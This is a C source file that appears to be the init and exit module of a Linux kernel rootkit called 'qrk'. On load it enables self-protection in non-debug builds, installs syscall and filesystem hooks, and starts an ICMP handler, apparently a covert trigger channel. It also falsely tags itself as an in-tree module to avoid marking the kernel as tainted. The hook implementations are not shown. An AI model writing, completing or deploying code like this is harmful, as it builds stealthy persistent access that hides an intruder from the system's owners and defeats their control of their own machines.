#include "qrk_common.h"

MODULE_LICENSE("GPL");
MODULE_INFO(intree, "Y");

int rk_init(void)
{
    int ret = 0;

#ifndef KDEBUG
    self_protect_on();
#endif

    dbg("hello: %s",KBUILD_MODNAME);
    dbg("qrk: loaded\n");

    dbg("qrk: hook_init engine INIT\n");
    ret = hook_init();
    if (ret < 0)
    {
        dbg("qrk: hook_init engine INIT ERROR");
        return ret;
    };

    dbg("qrk: do_hook INIT\n");
    ret = do_hook_init();
    if (ret < 0)
    {
        dbg("qrk: do_hook INIT ERROR");
        return ret;
    };

    dbg("qrk: fs_hook_init INIT\n");
    ret = fs_hook_init();
    if (ret < 0)
    {
        dbg("qrk: fs_hook_init INIT ERROR");
        return ret;
    };

    icmp_init();

    return 0;
}

void rk_exit(void)
{
    icmp_exit();
    fs_hook_exit();
    do_hook_exit();
    hook_exit();
    dbg("qrk: unloaded\n");
}

module_init(rk_init);
module_exit(rk_exit);